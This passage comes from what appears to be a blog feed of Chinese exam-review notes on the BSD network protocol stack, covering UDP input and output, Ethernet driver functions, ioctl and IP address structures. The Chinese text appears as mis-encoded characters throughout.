class="headerlink" title="udp_outå‡½æ•°"></a>udp_outå‡½æ•°</h3><p>å½“ç¨‹åºè°ƒç”¨sendï¼Œsendtoï¼Œsendmsgï¼Œwriteæˆ–writevæ—¶ä¼šå‘ç”ŸUDPè¾“å‡ºã€‚åŸºæœ¬æµç¨‹å¦‚ä¸‹å›¾ï¼š<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425111210300.png" alt="image-20230425111210300"></p><p><code>udp_output</code>ä¸»è¦å¹²è¿™å‡ ä»¶äº‹ï¼š</p><ul><li>æ·»åŠ IP&#x2F;UDPé¦–éƒ¨ï¼Œå…·ä½“è¿‡ç¨‹å¯ä»¥çœ‹å‰ä¸‰ç« åˆ†æmbufçš„éƒ¨åˆ†</li><li>æ£€éªŒå’Œè®¡ç®—å’Œä¼ªé¦–éƒ¨</li></ul><p>æˆ‘ä»¬åœ¨å‰ä¸‰ç« åˆ†æmbufæ—¶è¯´åˆ°è¿‡ï¼Œudpä¼šå¡«å†™ä¸€éƒ¨åˆ†é¦–éƒ¨ï¼Œipä¼šå¡«å†™ä¸€éƒ¨åˆ†é¦–éƒ¨ï¼Œè¿™é‡Œå°±æ˜¯åˆ†åˆ«è°ƒç”¨<code>udp_output</code>,<code>ip_output</code>å®ç°çš„<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425111755234.png" alt="image-20230425111755234"></p><p>ä¸‹å›¾ä¸­é˜´å½±éƒ¨åˆ†ç”±<code>ip_output()</code>å¡«å†™ï¼Œå…¶ä½™æµ…è‰²éƒ¨åˆ†äº¤ç”±<code>udp_output()</code>å¡«å†™</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425111716276.png" alt="image-20230425111716276"></p><p>UDPåœ¨æ£€éªŒå’Œæ—¶ä¼šåŒ…å«ä¸‰éƒ¨åˆ†å†…å®¹ï¼š12å­—èŠ‚çš„ä¼ªé¦–éƒ¨ï¼Œ8å­—èŠ‚çš„UDPé¦–éƒ¨ï¼ŒUDPæ•°æ®</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425112329338.png" alt="image-20230425112329338"></p><p>ä¼ªé¦–éƒ¨å’ŒUDPé¦–éƒ¨å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸‹å›¾æ˜¯å¡«å……é¦–éƒ¨å’Œæ£€éªŒå’Œçš„æ•´ä¸ªç¤ºæ„å›¾</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425112939950.png" alt="image-20230425112939950"></p><h3 id="CRCæ ¡éªŒç "><a href="#CRCæ ¡éªŒç " class="headerlink" title="CRCæ ¡éªŒç "></a>CRCæ ¡éªŒç </h3><p>è¿™éƒ¨åˆ†æœºç»„çš„æ—¶å€™å­¦è¿‡ï¼Œè‡ªè¡Œé€‚å½“å¤ä¹ ä¸€ä¸‹ï¼Œè¯¾ä»¶ä¾‹é¢˜å¦‚ä¸‹</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425113213347.png" alt="image-20230425113213347"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425113221906.png" alt="image-20230425113221906"></p><h3 id="udp-inputå‡½æ•°"><a href="#udp-inputå‡½æ•°" class="headerlink" title="udp_inputå‡½æ•°"></a>udp_inputå‡½æ•°</h3><p>å½“IPåœ¨å®ƒçš„åè®®å­—æ®µæŒ‡å®šä¸ºUDPçš„è¾“å…¥é˜Ÿåˆ—ä¸Šæ”¶åˆ°ä¸€ä¸ªIPæ•°æ®æŠ¥æ—¶ï¼Œæ‰å‘ç”ŸUDPçš„è¾“å…¥ã€‚IPé€šè¿‡åè®®äº¤æ¢è¡¨ä¸­çš„<code>pr_input</code>å‡½æ•°è°ƒç”¨å‡½æ•°<code>udp_input</code>ã€‚å› ä¸ºIPçš„è¾“å…¥æ˜¯åœ¨è½¯ä»¶ä¸­æ–­çº§ï¼Œæ‰€ä»¥<code>udp_input</code>ä¹Ÿåœ¨è¿™ä¸€çº§ä¸Šæ‰§è¡Œã€‚<code>udp_input</code>çš„ç›®æ ‡æ˜¯æŠŠUDPæ•°æ®æŠ¥æ”¾ç½®åˆ°åˆé€‚çš„æ’å£çš„ç¼“å­˜å†…ï¼Œå”¤é†’è¯¥æ’å£ä¸Šå› è¾“å…¥é˜»å¡çš„æ‰€æœ‰è¿›ç¨‹ã€‚<code>udp_input</code> å‡½æ•°çš„ä¸»è¦åˆ†ä¸‰ä¸ªéƒ¨åˆ†:</p><ul><li><p>UDPå¯¹æ”¶åˆ°çš„æ•°æ®æŠ¥å®Œæˆ<strong>ä¸€èˆ¬æ€§</strong>çš„ç¡®è®¤;</p></li><li><p>å¤„ç†ç›®çš„åœ°æ˜¯<strong>å•æ’­åœ°å€çš„UDPæ•°æ®æŠ¥</strong>ï¼šæ‰¾åˆ°åˆé€‚çš„PCB,æŠŠæ•°æ®æŠ¥æ”¾åˆ°æ’å£çš„ç¼“å­˜å†…ï¼Œ</p></li><li><p>å¤„ç†ç›®çš„åœ°æ˜¯<strong>å¹¿æ’­æˆ–å¤šæ’­åœ°å€çš„UDPæ•°æ®æŠ¥</strong>ï¼šå¿…é¡»æŠŠæ•°æ®æŠ¥æäº¤ç»™å¤šä¸ªæ’å£ã€‚</p></li></ul><blockquote><p>ç¡®è®¤éƒ¨åˆ†å¯ä»¥ç»§ç»­å¤ä¹ å‰ä¸‰ç« mbufåˆ†æéƒ¨åˆ†ï¼Œä¸ªäººæ„Ÿè§‰è¿™æœ¬ç« å’Œå‰ä¸‰ç« å…³ç³»è¿˜æ˜¯æ¯”è¾ƒç´§å¯†çš„ï¼Œå¯ä»¥å¤šå¯¹ç…§çœ‹çœ‹</p></blockquote><h3 id="è¯¾åç»ƒä¹ é¢˜"><a href="#è¯¾åç»ƒä¹ é¢˜" class="headerlink" title="è¯¾åç»ƒä¹ é¢˜"></a>è¯¾åç»ƒä¹ é¢˜</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425114209049.png" alt="image-20230425114209049"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œåè®®æ ˆCH4åŠCH6</title>
    <link href="/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6/"/>
    <url>/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h2><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230424232559912.png" alt="image-20230424232559912"></p><p>å»å¹´11æœˆä»½åšIOç›¸å…³æºç çš„æ—¶å€™å°±å·²ç»è§‰å¾—æœ‰äº›å®å®šä¹‰çº¯çº¯æ¶å¿ƒï¼Œæ²¡æƒ³åˆ°ä»Šæ—¥çš„ç½‘ç»œåè®®æ ˆå†ä¸€æ¬¡ä½“ä¼šäº†è¿™ç§æ„Ÿè§‰ğŸ˜…ï¼Œæ„Ÿè°¢ç½‘ç»œåè®®æ ˆè®©æˆ‘é‡æ¸©æ—§æ—¥çš„ç¾å¥½æ—¶å…‰ã€‚</p><h2 id="ç¬¬å››ç« -æ¥å£ï¼šä»¥å¤ªç½‘"><a href="#ç¬¬å››ç« -æ¥å£ï¼šä»¥å¤ªç½‘" class="headerlink" title="ç¬¬å››ç«  æ¥å£ï¼šä»¥å¤ªç½‘"></a>ç¬¬å››ç«  æ¥å£ï¼šä»¥å¤ªç½‘</h2><h3 id="ä»¥å¤ªç½‘æ¥å£"><a href="#ä»¥å¤ªç½‘æ¥å£" class="headerlink" title="ä»¥å¤ªç½‘æ¥å£"></a>ä»¥å¤ªç½‘æ¥å£</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230424225903986.png" alt="image-20230424225903986"></p><p>IPåˆ†ç»„çš„ä»¥å¤ªç½‘å¸§å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒåŒ…å«6å­—èŠ‚çš„ç›®çš„å’Œæºåœ°å€ï¼Œ2å­—èŠ‚çš„ç±»å‹ï¼Œæœ«å°¾4å­—èŠ‚çš„CRCã€‚å‰14ä¸ªå­—èŠ‚æˆ‘ä»¬åœ¨ä¸Šä¸€ç¯‡æ–‡ç« è®¨è®ºè¾“å…¥è¾“å‡ºæ—¶å·²ç»è§è¿‡ã€‚å¯¹äºIPåˆ†ç»„ï¼Œå…¶ç±»å‹æ˜¯å›ºå®šçš„<strong>0x0800</strong>ï¼ˆåè¿›åˆ¶2048ï¼‰</p><h3 id="leintrå‡½æ•°"><a href="#leintrå‡½æ•°" class="headerlink" title="leintrå‡½æ•°"></a>leintrå‡½æ•°</h3><blockquote><p> æ„Ÿè§‰è®°ä½è¿™å‡ ä¸ªå‡½æ•°å¹²ä»€ä¹ˆå°±è¡Œï¼Œä¹Ÿæ²¡å•¥ç‰¹åˆ«è¯´çš„ã€‚ä¸€ä¸ªä¸ªæºç éƒ½æŒºé•¿çš„ï¼Œæ”¾ä¸Šæ¥ä¼°è®¡ä¹Ÿæ²¡äººæƒ³çœ‹ã€‚</p></blockquote><p><code>leintr</code>æ£€æµ‹ç¡¬ä»¶ï¼Œå¹¶ä¸”å¦‚æœæœ‰ä¸€ä¸ªå¸§åˆ°è¾¾ï¼Œå°±è°ƒç”¨<code>leread</code>æŠŠè¿™ä¸ªå¸§ä»æ¥å£è½¬ç§»åˆ°ä¸€ä¸ªmbufé“¾ä¸­ã€‚å¦‚æœç¡¬ä»¶æŠ¥å‘Šä¸€ä¸ªå¸§å·²ä¼ è¾“å®Œæˆ–å‘ç°ä¸€ä¸ªå·®é”™(å¦‚ä¸€ä¸ªæœ‰é”™è¯¯çš„æ£€éªŒå’Œ)ï¼Œåˆ™<code>leintr</code>æ›´æ–°ç›¸åº”çš„æ¥å£ç»Ÿè®¡ï¼Œå¤ä½è¿™ä¸ªç¡¬ä»¶,å¹¶è°ƒç”¨<code>lestart</code>æ¥ä¼ è¾“å¦ä¸€ä¸ªå¸§ã€‚æ‰€æœ‰ä»¥å¤ªç½‘è®¾å¤‡é©±åŠ¨ç¨‹åºå°†å®ƒä»¬æ¥æ”¶åˆ°çš„å¸§ä¼ ç»™<code>ether_input</code>åšè¿›ä¸€æ­¥çš„å¤„ç†ã€‚è®¾å¤‡é©±åŠ¨ç¨‹åºæ„é€ çš„mbufé“¾ä¸åŒ…æ‹¬ä»¥å¤ªç½‘é¦–éƒ¨ï¼Œä»¥å¤ªç½‘é¦–éƒ¨ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å‚æ•°ä¼ é€’ç»™<code>ether_input</code>ã€‚ç»“æ„<code>ether_header</code>å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ether_</span> <span class="hljs-title">header</span> &#123;</span><br>u_char ether_dhost[<span class="hljs-number">6</span>] ;<span class="hljs-comment">/* Ethernet destination address */</span><br>u_char ether_shost[<span class="hljs-number">6</span>] ;<span class="hljs-comment">/* Ethernet source address*/</span><br>u_short ether_type;<span class="hljs-comment">/* Ethernet frame type */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="lereadå‡½æ•°"><a href="#lereadå‡½æ•°" class="headerlink" title="lereadå‡½æ•°"></a>lereadå‡½æ•°</h3><p>å‡½æ•°<code>leread</code>çš„å¼€å§‹æ˜¯ç”±<code>leintr</code>ä¼ ç»™å®ƒçš„ä¸€ä¸ªè¿ç»­çš„å†…å­˜ç¼“å†²åŒº,å¹¶ä¸”æ„é€ äº†ä¸€ä¸ª<code>ether_header</code>ç»“æ„å’Œ ä¸€ä¸ªmbufé“¾ã€‚è¿™ä¸ªé“¾è¡¨å­˜å‚¨æ¥è‡ªä»¥å¤ªç½‘å¸§çš„æ•°æ®ã€‚<code>leread</code>è¿˜å°†è¾“å…¥å¸§ä¼ ç»™BPFã€‚</p><h3 id="ether-inputå‡½æ•°"><a href="#ether-inputå‡½æ•°" class="headerlink" title="ether_inputå‡½æ•°"></a>ether_inputå‡½æ•°</h3><p>å‡½æ•°<code>ether_input</code>ï¼Œå®ƒæ£€æŸ¥ç»“æ„<code>ether_header</code>æ¥åˆ¤æ–­æ¥æ”¶åˆ°çš„æ•°æ®çš„ç±»å‹ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„åˆ†ç»„åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­ç­‰å¾…å¤„ç†ã€‚</p><h3 id="ether-outputå‡½æ•°"><a href="#ether-outputå‡½æ•°" class="headerlink" title="ether_outputå‡½æ•°"></a>ether_outputå‡½æ•°</h3><p>å½“ä¸€ä¸ªç½‘ç»œå±‚åè®®ï¼Œå¦‚IP,è°ƒç”¨æ­¤æ¥å£ifnetç»“æ„ä¸­æŒ‡å®šçš„å‡½æ•°<code>if_ output</code>æ—¶ï¼Œå¼€å§‹å¤„ç†è¾“å‡ºã€‚æ‰€æœ‰ä»¥å¤ªç½‘è®¾å¤‡çš„<code>if_ output</code>æ˜¯<code>ether_ output</code>ã€‚<code>ether_output</code>ç”¨14å­—èŠ‚ä»¥å¤ªç½‘é¦–éƒ¨å°è£…ä¸€ä¸ªä»¥å¤ªç½‘å¸§çš„æ•°æ®éƒ¨åˆ†ï¼Œå¹¶å°†å®ƒæ”¾ç½®åˆ°æ¥å£çš„å‘é€é˜Ÿåˆ—ä¸­ã€‚</p><h3 id="lestartå‡½æ•°"><a href="#lestartå‡½æ•°" class="headerlink" title="lestartå‡½æ•°"></a>lestartå‡½æ•°</h3><p>å‡½æ•°<code>lestart</code>ä»æ¥å£è¾“å‡ºé˜Ÿåˆ—ä¸­å–å‡ºæ’é˜Ÿçš„å¸§ï¼Œå¹¶äº¤ç»™LANCEä»¥å¤ªç½‘å¡å‘é€ã€‚å¦‚æœè®¾å¤‡ç©ºé—²ï¼Œè°ƒç”¨æ­¤å‡½æ•°å¼€å§‹å‘é€å¸§ã€‚</p><blockquote><p>å¦‚æœè®¾å¤‡å¿™ï¼Œå½“å®ƒå®Œæˆäº†å½“å‰å¸§çš„ä¼ è¾“æ—¶äº§ç”Ÿä¸€ä¸ªä¸­æ–­ã€‚è®¾å¤‡è°ƒç”¨<strong>lestart</strong>æ¥é€€é˜Ÿå¹¶ä¼ è¾“ä¸‹ä¸€å¸§ã€‚ä¸€æ—¦å¼€å§‹ï¼Œåè®®å±‚ä¸å†ç”¨è°ƒç”¨<strong>lestart</strong>æ¥æ’é˜Ÿå¸§ï¼Œå› ä¸ºé©±åŠ¨ç¨‹åºä¸æ–­é€€é˜Ÿå¹¶ä¼ è¾“å¸§ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºä¸ºæ­¢ã€‚</p></blockquote><h3 id="ioctlç³»ç»Ÿè°ƒç”¨"><a href="#ioctlç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ioctlç³»ç»Ÿè°ƒç”¨"></a>ioctlç³»ç»Ÿè°ƒç”¨</h3><blockquote><p>ä¸ªäººè®¤ä¸º<strong>ioctl</strong>æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„éƒ¨åˆ†ï¼Œå› ä¸ºä»–ä¸ä»…ä»…æ¶‰åŠç½‘ç»œè®¾å¤‡ã€‚åœ¨æˆ‘ä»¬å¸¸ç”¨çš„Linuxç³»ç»Ÿä¸­ï¼Œioctlæ˜¯ä½œä¸ºè¿›ç¨‹å’Œè®¾å¤‡äº¤äº’çš„æœ€é‡è¦çš„ç³»ç»Ÿè°ƒç”¨æˆ–è€…è¯´æ¥å£ï¼ŒåŒ…æ‹¬å­—ç¬¦å‹è®¾å¤‡ï¼ˆä¾‹ï¼šç»ˆç«¯ã€æ–‡ä»¶ï¼‰ã€å­˜å‚¨è®¾å¤‡ï¼ˆä¾‹ï¼šç£ç›˜ï¼‰ä»¥åŠç½‘ç»œè®¾å¤‡ï¼ˆä¾‹ï¼šç½‘å¡ï¼‰ã€‚å¯ä»¥è¯´ç»å¤§å¤šæ•°è®¾å¤‡çš„é©±åŠ¨ç¨‹åºï¼ˆè‡³å°‘åœ¨æˆ‘çš„è®¤çŸ¥é‡Œï¼‰éƒ½è¦ä¾é æ­¤å‡½æ•°æ¥å®ç°ï¼Œæ˜¯ç ”ç©¶Linuxç³»ç»Ÿå†…æ ¸ã€å†…æ ¸æ€å¼€å‘å’Œå®‰å…¨éå¸¸é‡è¦çš„ä¸€éƒ¨åˆ†ã€‚</p><p><strong>ä½†åœ¨è¿™é—¨è¯¾é‡Œæˆ‘ä¸ç¡®å®šå®ƒæ˜¯ä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Ÿ</strong>ğŸ˜</p></blockquote><p>åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ioctl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> com, ...)</span>;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºå¦‚ä¸‹å«ä¹‰ï¼š</p><ul><li>fdï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼Œå³ioctlè¦äº¤äº’çš„è®¾å¤‡æ˜¯è°</li><li>comï¼Œcommandå‘½ä»¤ï¼Œå³ioctlè¦è°ƒç”¨å“ªä¸ªå‘½ä»¤ï¼ˆåœ¨é©±åŠ¨ç¨‹åºä¸­ä¼šæ ¹æ®ä¸åŒçš„å€¼æ‰§è¡Œä¸åŒçš„å‡½æ•°æˆ–è€…å‘½ä»¤ï¼‰</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºæ‰§è¡Œcommandå‘½ä»¤æ—¶ä¼ å…¥çš„å‚æ•°</li></ul><p>æœ¬ä¹¦ä¸­æ¶‰åŠåˆ°çš„ä¸ç½‘ç»œæ¥å£ç›¸å…³çš„comå‘½ä»¤å¦‚ä¸‹ï¼š</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425001108434.png" alt="image-20230425001108434"></p><blockquote><p>å…¶ä¸­å‘½ä»¤åˆ—å³ä¸ºioctlçš„ç¬¬äºŒä¸ªå‚æ•°com</p></blockquote><h4 id="ifioctlå‡½æ•°"><a href="#ifioctlå‡½æ•°" class="headerlink" title="ifioctlå‡½æ•°"></a>ifioctlå‡½æ•°</h4><blockquote><p>ifioctlèµ·å§‹å°±æ˜¯ioctlè°ƒç”¨åï¼Œç½‘ç»œæ¥å£é©±åŠ¨ç¨‹åºæ‰€å¯¹åº”çš„å¤„ç†å‡½æ•°ã€‚</p><p>å¤§æ¦‚æµç¨‹å°±æ˜¯ç”¨æˆ·è¿›ç¨‹è°ƒç”¨ioctlç³»ç»Ÿè°ƒç”¨ï¼Œå‘ç”Ÿä¸­æ–­é™·å…¥å†…æ ¸æ€ï¼Œç„¶åæ“ä½œç³»ç»Ÿæ ¹æ®fdæ‰¾åˆ°å¯¹åº”è®¾å¤‡é©±åŠ¨ç¨‹åºï¼Œè¿™é‡Œå°±æ˜¯ç½‘ç»œæ¥å£çš„é©±åŠ¨ç¨‹åºã€‚éšåç½‘ç»œæ¥å£çš„ifioctlæ ¹æ®ioctlçš„åä¸¤ä¸ªå‚æ•°è¿›è¡Œå¤„ç†ï¼Œå‚ç…§ä¸Šå›¾çš„è¡¨,å·²ç»æœ‰äº†ä¸€äº›å‘½ä»¤çš„æè¿°ã€‚</p></blockquote><ul><li>å¯¹äºå‘½ä»¤<strong>SIOCGIFCONF</strong>ï¼Œ<code>ifioctl</code>è°ƒç”¨<code>ifconf</code>æ¥æ„é€ ä¸€ä¸ªå¯å˜é•¿ifreqç»“æ„çš„è¡¨ã€‚</li><li>å¯¹äºå…¶ä»–<code>ioctl</code>å‘½ä»¤ï¼Œæ•°æ®å‚æ•°æ˜¯æŒ‡å‘ä¸€ä¸ª<code>ifreq</code>ç»“æ„çš„æŒ‡é’ˆã€‚<code>ifunit</code>åœ¨ifnetåˆ—è¡¨ä¸­æŸ¥æ‰¾åç§°ä¸ºè¿›ç¨‹åœ¨ifr-&gt;ifr_nameä¸­æä¾›çš„æ–‡æœ¬åç§°(ä¾‹å¦‚:â€œs10â€ï¼Œâ€œle1â€æˆ–â€œlo0â€)çš„æ¥å£ã€‚å¦‚æœæ²¡æœ‰åŒ¹é…çš„æ¥å£ï¼Œifioctlè¿”å› ENXIOã€‚</li><li>å¯¹äºå‘½ä»¤<strong>SIOSIFFLAGS</strong>ï¼Œ<code>ifioctl</code> å¯ä»¥åˆ©ç”¨ifconfigæ¥è®¾ç½®æˆ–æ¸…é™¤æ ‡å¿—<strong>IFF_UP</strong>ï¼Œå®ç°å¯¹ä¸€ä¸ªæ¥å£çš„ç¦ç”¨å’Œå¯ç”¨ã€‚è¿™å°†ä¼šè°ƒç”¨<code>if_up</code>å’Œ<code>if_down</code>å‡½æ•°</li></ul><h2 id="ç¬¬6ç« -IPç¼–å€"><a href="#ç¬¬6ç« -IPç¼–å€" class="headerlink" title="ç¬¬6ç«  IPç¼–å€"></a>ç¬¬6ç«  IPç¼–å€</h2><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><p>å‡ ç±»IPåœ°å€åˆ’åˆ†ï¼Œä¸»æœºå’Œè·¯ç”±å™¨ç®€å•çœ‹çœ‹å°±å¥½ï¼Œä¹Ÿæ²¡ä»€ä¹ˆè¯´çš„</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425004924718.png" alt="image-20230425004924718"></p><h3 id="sockaddr-inç»“æ„"><a href="#sockaddr-inç»“æ„" class="headerlink" title="sockaddr_inç»“æ„"></a>sockaddr_inç»“æ„</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> &#123;</span><br>u_1ong s_addr;<span class="hljs-comment">/* 32-bit IP address, net byte order */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_</span> <span class="hljs-title">in</span> &#123;</span><br>u_char sin_len;<span class="hljs-comment">/* sizeof (struct sockaddr_ in) = 16 */</span><br>u_char sin_family;<span class="hljs-comment">/* AF_INET */</span><br>u_short sin_port;<span class="hljs-comment">/* 16-bit port number, net byte order */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_</span> <span class="hljs-title">addr</span> ;</span><br><span class="hljs-type">char</span> sin_zero[<span class="hljs-number">8</span>] ;<span class="hljs-comment">/* unused */</span><br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªç»“æ„ä½“æ¯”è¾ƒç®€å•ï¼Œä½†è¿˜æ˜¯æŒºå¸¸ç”¨çš„ï¼Œéœ€è¦é¢å¤–æ³¨æ„çš„æ˜¯s_addrçš„å­˜å‚¨å¹¶ä¸æ ¹æ®ç³»ç»Ÿçš„å¤§å°ç«¯ï¼Œè€Œæ˜¯æ ¹æ®ç½‘ç»œæµçš„é¡ºåº</p></blockquote><p>sockaddrå’Œsockaddr_inå¯¹æ¯”å¦‚ä¸‹ï¼š</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425010936449.png" alt="image-20230425010936449"></p><h3 id="in-ifaddrç»“æ„"><a href="#in-ifaddrç»“æ„" class="headerlink" title="in_ifaddrç»“æ„"></a>in_ifaddrç»“æ„</h3><p><code>in_ifaddr</code>ä¸ºInternetåè®®çš„æ¥å£åœ°å€ç»“æ„ã€‚å¯¹äºæ¯ä¸ªæŒ‡æ´¾ç»™ä¸€ä¸ªæ¥å£çš„IPåœ°å€ï¼Œåˆ†é…äº†ä¸€ä¸ª<code>in_ifaddr</code>ç»“æ„ï¼Œå¹¶ä¸”æ·»åŠ åˆ°æ¥å£åœ°å€åˆ—è¡¨å’ŒIPåœ°å€å…¨å±€åˆ—è¡¨ä¸­ã€‚</p><h3 id="in-ifinitå‡½æ•°"><a href="#in-ifinitå‡½æ•°" class="headerlink" title="in_ifinitå‡½æ•°"></a>in_ifinitå‡½æ•°</h3><blockquote><p>æŒ‰è¯¾ä»¶å’Œè¯¾æœ¬çš„è¯ä¸­é—´è¿˜æœ‰ifioctlå’Œio_controlå‡½æ•°çš„éƒ¨åˆ†æ²¡æï¼Œä½†è¯´å®è¯çœŸä¸çŸ¥é“åˆ†æè¿™å‡ ä¸ªå‡½æ•°æœ‰ä»€ä¹ˆç”¨ğŸ˜…ï¼Œæ€»ä¸èƒ½è®©æˆ‘è€ƒè¯•ä¹Ÿéš”ç€å®¡æºç å§ï¼Œæˆ‘ä¸ªäººè§‰å¾—çŸ¥é“è¿™äº›å‡½æ•°å¹²ä»€ä¹ˆå°±è¡Œäº†ã€‚å¸Œæœ›è€å¸ˆä¸è¦æ‰“æˆ‘çš„è„¸ï¼Œæ±‚æ±‚äº†ğŸ˜‡</p></blockquote><p>ä¸»è¦æ­¥éª¤ï¼š</p><ul><li>å°†åœ°å€å¤åˆ¶åˆ°æ­¤ç»“æ„å¹¶å°†æ­¤å˜åŒ–é€šçŸ¥ç¡¬ä»¶;</li><li>å¿½ç•¥åŸåœ°å€é…ç½®çš„ä»»ä½•è·¯ç”±;</li><li>ä¸ºè¿™ä¸ªåœ°å€å»ºç«‹-ä¸€ä¸ªå­ç½‘æ©ç ;</li><li>å»ºç«‹ä¸€ä¸ªé»˜è®¤è·¯ç”±åˆ°è¿æ¥çš„ç½‘ç»œ(æˆ–ä¸»æœº);</li><li>å°†æ­¤æ¥å£åŠ å…¥åˆ°æ‰€æœ‰ä¸»æœºç»„ã€‚</li></ul><h3 id="ç»ƒä¹ é¢˜"><a href="#ç»ƒä¹ é¢˜" class="headerlink" title="ç»ƒä¹ é¢˜"></a>ç»ƒä¹ é¢˜</h3><blockquote><p>è¿™ä¸¤ç« å¤ä¹ çš„çœŸæ²¡ä»€ä¹ˆé“ç†ï¼Œå…¨æ˜¯å‡½æ•°æºç åˆ†æï¼Œå®åœ¨æ²¡ä»€ä¹ˆçœ‹å¤´ã€‚è¯¾ä»¶ä¸Šè¿˜æœ‰å‡ ä¸ªç»ƒä¹ é¢˜å¯ä»¥çœ‹çœ‹ï¼Œå¸Œæœ›è€ƒè¯•åˆ«æ¶å¿ƒäºº</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425013954629.png" alt="image-20230425013954629"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425014013419.png" alt="image-20230425014013419"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH4%E5%8F%8ACH6.assets/image-20230425013925701.png" alt="image-20230425013925701"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œåè®®æ ˆCH1-CH3</title>
    <link href="/2023/04/24/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0/"/>
    <url>/2023/04/24/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0/</url>
    
